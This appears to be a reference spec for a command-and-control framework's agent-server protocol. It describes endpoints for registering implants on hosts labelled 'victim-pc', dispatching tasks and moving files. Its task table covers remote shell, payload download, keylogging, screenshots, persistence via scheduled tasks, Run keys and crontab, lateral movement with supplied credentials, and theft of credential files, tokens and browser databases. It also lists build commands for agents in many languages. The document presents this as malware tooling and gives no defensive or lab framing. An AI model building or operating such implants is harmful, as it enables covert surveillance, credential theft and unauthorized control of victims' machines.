# C2 Wire Protocol

Reference spec for the agent <-> server communication. Anything that speaks
this HTTP/JSON protocol can be an agent — see `clients/` for the
implementations.

Base URL: the `--server` value given to the agent, e.g. `http://127.0.0.1:8000`.

## Authentication

Every agent request carries the shared agent token:

```
X-Agent-Token: <AGENT_TOKEN>
```

- The token is generated on first server start and persisted in
  `server/.agent_token` (Windows) / `server/.agent_token_wsl` (Unix).
- Protect the file — anyone holding it can register agents.
- All bodies are JSON (`Content-Type: application/json`), except file uploads.

## Endpoints

### 1. Register — `POST /api/register`

Registers (or re-syncs) an agent. Omitting `agent_id` (or an unknown one)
generates a fresh id; the agent must persist and send it on every request.

```json
{
  "agent_id": "optional, resume an existing agent",
  "hostname": "victim-pc",
  "username": "bob",
  "os": "windows",
  "arch": "AMD64",
  "pid": 1234,
  "ip": "10.0.0.5",
  "type": "python",
  "version": "1.0.0"
}
```

Response `200`: `{ "agent_id": "3f2c...", "status": "registered" }`

### 2. Checkin — `POST /api/checkin`

Heartbeat. Updates `last_seen` and returns all pending tasks (claimed
atomically — exactly one checkin gets each task).

```json
{ "agent_id": "3f2c..." }
```

Response `200`:

```json
{
  "tasks": [
    { "task_id": "a1b2...", "type": "shell", "args": { "command": "whoami", "timeout": 30 } },
    { "task_id": "c3d4...", "type": "download", "args": { "file": "payload.exe", "destination": "C:\\Temp\\payload.exe" } },
    { "task_id": "e5f6...", "type": "upload", "args": { "path": "C:\\Temp\\dump.txt" } },
    { "task_id": "g7h8...", "type": "sleep", "args": { "seconds": 15 } },
    { "task_id": "i9j0...", "type": "exit", "args": {} }
  ]
}
```

Response `404` means the server no longer knows this `agent_id` → call
`/api/register` again.

> **Claiming and retry.** A checkin atomically claims tasks (`pending -> sent`).
> If no result arrives within `WYM_RETRY_AFTER` seconds (default `180`), the
> next checkin of that agent flips the task back to `pending`. Operators can
> also re-queue `sent`/`failed` tasks from the dashboard.

### 3. Report result — `POST /api/result`

```json
{
  "agent_id": "3f2c...",
  "task_id": "a1b2...",
  "output": "acme\\bob",
  "exit_code": 0,
  "error": ""
}
```

Non-empty `error` → task `failed`, otherwise `completed`.
Response: `{ "ok": true }` or `404` if the task id does not belong to the
agent.

### 4. File download — `GET /api/files/{task_id}`

Used for `download` tasks. The server resolves `args.file` from `server/shared/`
and streams it. Same `X-Agent-Token` header.

### 5. File upload — `POST /api/files/{task_id}`

Used for `upload` tasks. Send `multipart/form-data`, field name `file`. The
server stores it in `server/collected/` as
`<agent_id>__<task_id>__<original name>`.

## Task types

| type         | args                                             | behaviour |
|--------------|--------------------------------------------------|-----------|
| `shell`      | `{"command", "timeout": 120}`                    | run via the OS shell; output capped at 12000 chars; default timeout 120s (max 3600) |
| `download`   | `{"file", "destination"}`                        | pull `shared/<file>`; `destination` optional (or a dir → append file name); creates parents |
| `upload`     | `{"path": "/abs/path"}`                          | push a file to `collected/` |
| `clipboard`  | `{"action": "get\|set", "text"}`                 | Windows PowerShell / Linux `xclip`-`wl-paste`-`xsel` / macOS `pbcopy`-`pbpaste` |
| `keylog`     | `{"action": "start\|stop\|dump"}`                | background logger; Windows `GetAsyncKeyState`, Linux `/dev/input` or pynput, **macOS unsupported** |
| `screenshot` | `{"name"}`                                       | capture desktop PNG → upload via files endpoint |
| `sleep`      | `{"seconds": N}`                                 | change heartbeat interval (min 1) |
| `persistence`| `{}` / `{"method"}`                              | copy self + register logon/reboot hook with the same flags; Windows scheduled task `wymagent-persist` (+ HKCU Run fallback), Linux/macOS `@reboot` crontab + systemd --user |
| `lateral`    | `{"subnet", "user", "pass"}`                     | ARP/`ip neigh` peer discovery, best-effort copy+launch (`net use`+`schtasks` / `sshpass scp`); creds from args or `WYM_LAT_USER`/`WYM_LAT_PASS` |
| `steal`      | `{"profile": "all\|env\|tokens\|browser"}`       | collect env/cred files/browser DBs **raw** (no decrypt), zip + upload `steal.zip` |
| `clone`      | `{"action": "start\|stop\|status", "target", "command", "interval"}` | watcher that relaunches a stale/dead target |
| `exit`       | `{}`                                             | terminate gracefully |

`args` is always a JSON object. `timeout`/`destination` are optional on the
wire — all clients honour them and fall back to the defaults above.

## Agent lifecycle

1. [ ] Load/create `agent_id` from the local state file (`~/.wymagent.json`).
2. [ ] First run: `POST /api/register` → store returned `agent_id`.
3. [ ] Loop: `checkin` → execute tasks → `result` per task → sleep
       `interval + jitter` s.
4. [ ] On `404` from checkin → re-register and continue.
5. [ ] On `exit` task → report and stop.
6. [ ] `download`/`upload` handlers must be idempotent (tasks are retried).

## Porting checklist (new language)

1. [ ] HTTP client with custom header `X-Agent-Token`.
2. [ ] JSON snake_case fields (`agent_id`, `exit_code`, ...).
3. [ ] Persist `agent_id` to a state file; re-register on `404`.
4. [ ] Implement all task types; unknown types → `exit_code: 1`.
5. [ ] Shell: Windows `cmd /C`, POSIX `sh -c`.
6. [ ] Per-task shell `timeout` (default 120) kills the child → `exit_code: 124`.
7. [ ] Download destination: dir → append file name; create parents.
8. [ ] Jitter: sleep `interval + random(0..N)`.
9. [ ] Best-effort local IP (UDP connect trick).
10. [ ] `--token` + `WYM_TOKEN`; minus-prefixed values use `--foo=bar`.
11. [ ] All six env vars (`WYM_SERVER` `WYM_TOKEN` `WYM_INTERVAL` `WYM_JITTER`
     `WYM_STATE_FILE` `WYM_VERBOSE`) as flag fallbacks + `-h`/`--help`.

## Reference ports + build commands

| file          | language       | run / build command |
|---------------|----------------|---------------------|
| `agent.py`    | Python 3.9+    | `pip install requests; python agent.py --server ... --token ...` |
| `agent.js`    | Node.js        | `node agent.js --server ... --token ...` |
| `agent.sh`    | Bash           | `./agent.sh` (needs `curl` + `jq` or `python3`) |
| `agent.ps1`   | PowerShell 5+  | `powershell -ExecutionPolicy Bypass -File agent.ps1 -Server ... -Token ...` |
| `agent.php`   | PHP CLI        | `php agent.php` |
| `agent.rb`    | Ruby           | `ruby agent.rb` |
| `agent.pl`    | Perl           | `perl agent.pl` |
| `agent.lua`   | Lua 5.x        | `lua agent.lua` (needs `luasocket`) |
| `agent.go`    | Go 1.21+       | `go build -o agent agent.go clone_unix.go keylog_linux.go` |
| `agent.rs`    | Rust           | `cargo build --release` |
| `agent.c`     | C (gcc/clang + libcurl) | `gcc -O2 -o agent agent.c -lcurl` |
| `agent.cpp`   | C++ (g++ + libcurl)     | `g++ -O2 -o agent agent.cpp -lcurl` |
| `agent.cs`    | .NET 8+        | `dotnet build agent.csproj -c Release` (Windows targets only) |
| `agent.java`  | JDK 11+        | `javac -encoding UTF-8 agent.java && java Agent` |

## Server-side build toolchains

Used by `/generate` → "build on server".

| Toolchain | Windows | Linux / WSL | macOS | Notes |
|-----------|---------|-------------|-------|-------|
| Go        | `winget install GoLang.Go` | `apt-get install golang` | `brew install go` | `GOOS`/`GOARCH` cross |
| Rust      | `winget install Rustlang.Rustup` | `apt-get install rustc cargo` | `brew install rust` | `rustup target add` per target; Linux also needs `autoconf automake libtool libevdev-dev` + X11 dev (`libxi-dev` ...) for `rdev` |
| C / C++   | WinLibs / MinGW | `build-essential libcurl4-openssl-dev` | `brew install gcc` | libcurl headers |
| .NET SDK  | `winget install Microsoft.DotNet.SDK.8` | `apt-get install dotnet-sdk-8.0` / `./dotnet-install.sh` | `brew install dotnet` | C# → Windows RIDs only |
| Java      | Oracle JDK / `winget install Oracle.JDK` | `openjdk-17-jdk` | `brew install openjdk` | cross-platform JAR |
| Android   | Android Studio / SDK cmdline-tools | same (any OS) | same | `gradle` + `ANDROID_HOME`/`ANDROID_SDK_ROOT`; template `clients/mobile/android` |
| iOS       | `tools/ios-builder-setup.ps1` | `tools/ios-builder-setup.sh` | `xcode-select --install` | `builder` (MobAI ios-builder, any OS → GitHub macOS runner); macOS fallback: `xcrun swiftc` |

On Linux/macOS the bundled `dotnet-install.sh` installs the SDK to `~/.dotnet`
without root and persists `PATH`; the server probes `~/.dotnet` directly.